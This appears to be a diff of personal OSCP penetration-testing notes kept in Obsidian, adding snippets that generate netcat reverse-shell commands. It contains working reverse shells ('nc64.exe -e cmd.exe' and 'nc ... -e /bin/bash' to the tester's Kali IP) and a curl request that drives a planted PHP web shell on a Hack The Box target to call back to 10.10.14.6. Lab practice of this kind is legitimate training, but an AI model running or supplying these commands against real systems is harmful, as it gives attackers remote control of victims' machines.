@@ -223,6 +223,15 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 [[Netcat.exe]]
 
+Windows
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `nc64.exe -e cmd.exe ${KaliIP} 443`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Linux
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
@@ -230,11 +239,12 @@ const command = `nc ${KaliIP} 80 -e /bin/bash`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-
+Copy nc64.exe to current dir
 ```
-put /opt/netcat/nc64.exe nc64.exe
+cp ~/Desktop/Tools/NC/nc64.exe .
 ```
 
+Executing a file from SMB
 ```
 curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.6 443'
 ```
